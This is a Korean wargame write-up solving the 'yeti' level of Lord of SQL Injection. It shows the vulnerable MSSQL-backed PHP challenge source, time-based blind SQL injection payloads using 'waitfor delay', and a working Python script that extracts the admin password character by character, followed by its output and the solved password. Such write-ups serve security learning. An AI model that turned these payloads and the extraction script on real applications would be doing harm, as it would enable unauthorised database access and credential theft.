---
title: "[Lord of SQL Injection] LoS - yeti 문제풀이"
date: 2019-07-29
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제 이름은 `yeti`다.
소스코드를 짜서 풀어야 하는 `Blind SQL Injection` 문제였다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from prob_yeti where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("yeti");
  if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);

  $query = "select pw from prob_yeti where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("yeti"); 
  highlight_file(__FILE__);
?>
```

문제를 풀기 위해서는 `id='admin'`일 때 `pw`의 값을 알아야 한다.
그런데 `pw`의 값을 정확하게 알아야 하는데 내가 입력한 쿼리의 결과가 참인지 거짓인지 구분할 만한 무언가가 없다.
그래서 `Time based Blind SQL Injection`를 통해 `pw`의 값을 알아내기로 했다.
`MySQL`에서는 그냥 `sleep`를 사용하면 됬었는데, `MSSQL`에서는 `sleep`가 딱히 없는 것 같다.
그래서 `waitfor delay`를 사용했다.
`waitfor delay [지연시간]`의 형태로 사용하면 되는데, 이 때 `지연시간`은 `00:00:05`와 같이 `시:분:초`의 형태로 넣어 주어야 한다.
먼저 아래의 값을 입력 해 `waitfor delay`로 문제를 풀 수 있는지 테스트 해 보았다.  

```plain
?id=a&pw=1' if 1=1 waitfor delay '00:00:03' else waitfor delay '00:00:00' --
```

`if`문을 통해 `1=1`의 조건을 검사하고 해당 조건이 참이라면 3초 동안 지연을, 아니라면 지연을 하지 않는 쿼리문이다.
해당 쿼리 테스트 결과 아래와 같이 3초 지연된 결과를 받을 수 있었다.  

![](./images/los/yeti/yeti_01.png)  

이제 위의 쿼리에서 `1=1` 부분을 `pw`의 길이와 값을 알아내기 위한 쿼리로 바꾸면 문제를 풀 수 있을 것이다.
길이를 알아내기 위해서 아래와 같은 쿼리를 사용했다.  

```plain
id=a&pw=1' if ((select len(pw) from prob_yeti where id='admin') = 1) waitfor delay '00:00:03' else waitfor delay '00:00:00' -- 
```

`prob_yeti` 테이블에서 `id='admin'`인 행의 `pw 길이`를 `select`하고 만약 그 결과가 `3초 이상 지연`된다면 해당 값이 길이일 것이다.
또한 값을 알아내기 위해서는 아래와 같은 쿼리를 사용했다.  

```plain
id=a&pw=1' if ((select pw from prob_yeti where id='admin') like 'a%') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- 
```

`like`을 사용했는데, 만약 `prob_yeti` 테이블에서 `id='admin'`인 행의 `pw`를 추출 했을 때 맨 첫번째 글자가 `a`라면 3초 지연 후 결과 값을 얻을 수 있을 것이다.
이를 바탕으로 아래와 같이 자동화 코드를 구현했다.  

```python
import requests
import time

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?id=a&pw=1'"
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 40):
	try:
		start = time.time()
		query = url + " if ((select len(pw) from prob_yeti where id='admin') = " + str(i) + ") waitfor delay '00:00:03' else waitfor delay '00:00:00' -- "
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue
	if (time.time() - start) > 3:
		length = i
		break	

print "[+] Found length : ", length

print "[+] Find password"
	
for j in range(1, length + 1):
	for i in range(48, 123):
		try:
			start = time.time()
			query = url + " if ((select pw from prob_yeti where id='admin') like '" + flag + str(chr(i)) + "%') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- "
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if (time.time() - start) > 3:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

그 결과 아래와 같이 결과값을 얻을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 6
[+] Found 2 : 64
[+] Found 3 : 642
[+] Found 4 : 6425
[+] Found 5 : 6425B
[+] Found 6 : 6425B7
[+] Found 7 : 6425B72
[+] Found 8 : 6425B725
[+] Found password :  6425B725
[+] End
```

따라서 알파벳을 소문자로 바꾸어 아래와 같이 입력하면 문제를 풀 수 있다.  

```plain
?pw=6425b725
```

---

```php
------------------------------------------------------------------------------------
query : select id from prob_yeti where id='' and pw='6425b725'
------------------------------------------------------------------------------------

YETI Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("yeti");
  if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);

  $query = "select pw from prob_yeti where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("yeti"); 
  highlight_file(__FILE__);
?>
```

---

```plain
YETI Clear!!
```